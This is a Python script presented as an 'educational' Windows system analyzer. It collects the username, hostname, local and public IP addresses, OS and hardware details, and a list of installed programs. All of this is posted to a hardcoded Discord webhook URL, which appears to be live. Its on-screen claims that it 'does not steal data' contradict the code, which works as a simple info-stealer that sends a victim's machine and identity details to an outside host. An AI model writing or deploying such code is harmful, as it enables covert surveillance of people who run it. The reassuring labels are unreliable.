import os
import json
import base64
import requests
import socket
import subprocess
import platform
import psutil

# Configurações para Windows
class SystemAnalyzer:
    def __init__(self, webhook_url=None):
        self.webhook_url = webhook_url
        self.session_id = base64.b85encode(os.urandom(16)).decode()
        
    def get_system_info(self):
        """Coleta informações do sistema Windows"""
        try:
            # Informações do sistema
            cpu_info = platform.processor()
            memory = psutil.virtual_memory()
            disk = psutil.disk_usage('/')
            
            return {
                "system": platform.system(),
                "version": platform.version(),
                "cpu": cpu_info,
                "ram_gb": round(memory.total / (1024**3), 2),
                "disk_free_gb": round(disk.free / (1024**3), 2),
                "username": os.getenv('USERNAME'),
                "hostname": socket.gethostname()
            }
        except Exception as e:
            return {"error": str(e)}

    def get_network_info(self):
        """Obtém informações de rede"""
        try:
            hostname = socket.gethostname()
            ip_local = socket.gethostbyname(hostname)
            
            # IP público
            try:
                ip_public = requests.get('https://api.ipify.org', timeout=5).text
            except:
                ip_public = "Unable to get public IP"
                
            return {
                "local_ip": ip_local,
                "public_ip": ip_public,
                "hostname": hostname
            }
        except Exception as e:
            return {"error": str(e)}

    def get_installed_apps(self):
        """Lista alguns programas instalados"""
        try:
            # Método alternativo para Windows
            apps = []
            try:
                # Tenta via registry
                result = subprocess.check_output(
                    'powershell "Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName"', 
                    shell=True
                ).decode().split('\n')
                apps = [app.strip() for app in result if app.strip() and 'DisplayName' not in app][:10]
            except:
                apps = ["Unable to retrieve apps list"]
                
            return apps
        except Exception as e:
            return [f"Error: {str(e)}"]

    def create_system_report(self):
        """Cria relatório do sistema"""
        return {
            "system_info": self.get_system_info(),
            "network_info": self.get_network_info(),
            "installed_apps": self.get_installed_apps(),
            "session_id": self.session_id,
            "timestamp": "2024-09-02T00:00:00Z"
        }

    def send_to_discord(self, data):
        """Envia para webhook """
        if not self.webhook_url:
            return False
            
        try:
            embed = {
                "title": "💻 System Analysis Report",
                "color": 0x3498db,
                "fields": [
                    {
                        "name": "🖥️ System",
                        "value": f"**OS:** {data['system_info']['system']}\n**Version:** {data['system_info']['version']}",
                        "inline": True
                    },
                    {
                        "name": "⚙️ Hardware",
                        "value": f"**CPU:** {data['system_info']['cpu'][:30]}...\n**RAM:** {data['system_info']['ram_gb']}GB",
                        "inline": True
                    },
                    {
                        "name": "🌐 Network",
                        "value": f"**Local IP:** {data['network_info']['local_ip']}\n**Public IP:** {data['network_info']['public_ip']}",
                        "inline": False
                    },
                    {
                        "name": "👤 User",
                        "value": f"**Username:** {data['system_info']['username']}\n**Hostname:** {data['system_info']['hostname']}",
                        "inline": True
                    }
                ],
                "footer": {"text": "System Analyzer - Educational Purpose Only"}
            }
            
            payload = {
                "content": "📊 **System Analysis Complete**",
                "embeds": [embed],
                "username": "System-Analyzer",
                "avatar_url": "https://i.imgur.com/6Bj4Wxx.png"
            }
            
            response = requests.post(
                self.webhook_url,
                json=payload,
                timeout=15
            )
            
            return response.status_code == 200
        except Exception as e:
            print(f"Webhook error: {e}")
            return False

    def run_analysis(self):
        """Executa análise educativa"""
        print("💻 Analyzing system...")
        
        report = self.create_system_report()
        
        print(f"\n📊 System: {report['system_info']['system']} {report['system_info']['version']}")
        print(f"🖥️ CPU: {report['system_info']['cpu']}")
        print(f"💾 RAM: {report['system_info']['ram_gb']}GB")
        print(f"👤 User: {report['system_info']['username']}")
        print(f"🌐 Local IP: {report['network_info']['local_ip']}")
        print(f"🌐 Public IP: {report['network_info']['public_ip']}")
        print(f"📦 Installed Apps: {len(report['installed_apps'])} found")
        
        if self.webhook_url:
            print("\n⚠️ Educational webhook simulation")
            self.send_to_discord(report) 
            
        return report
        
if __name__ == "__main__":
    print("=== SYSTEM ANALYZER (EDUCATIONAL) ===")
    print("⚠️ For learning purposes only!")
    print("⚠️ Does not steal data or harm systems!\n")
   
    try:
        import psutil
    except ImportError:
        print("Installing required packages...")
        os.system("pip install psutil requests")
        import psutil
        import requests
    
    analyzer = SystemAnalyzer(webhook_url="https://discord.com/api/webhooks/1413174338085191721/jWjTrhSDZmdx2KzXb1RD9hMR0RjSMkPXVyVxXOsCPKCuWR4A1ET1jrjpX40yIYz2vbCl")
    result = analyzer.run_analysis()
    
    print(f"\n✅ Analysis completed safely!")
    print(f"Session ID: {result['session_id']}")
    
    input("\nPress Enter to exit...")
